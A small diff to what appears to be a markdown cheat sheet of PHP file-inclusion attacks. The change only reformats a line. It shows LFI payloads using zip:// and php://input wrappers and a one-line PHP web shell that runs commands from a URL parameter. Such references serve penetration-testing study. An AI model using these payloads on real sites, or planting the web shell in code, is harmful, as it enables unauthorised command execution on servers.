@@ -122,7 +122,7 @@ Final payload : `http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 `http://example.com/index.php?page=php://input&cmd=ls`
 
-POST DATA: <?php system($_GET['cmd']); ?>
+`POST DATA: <?php system($_GET['cmd']); ?>`
 
 ### d. Path and dot truncation:
 
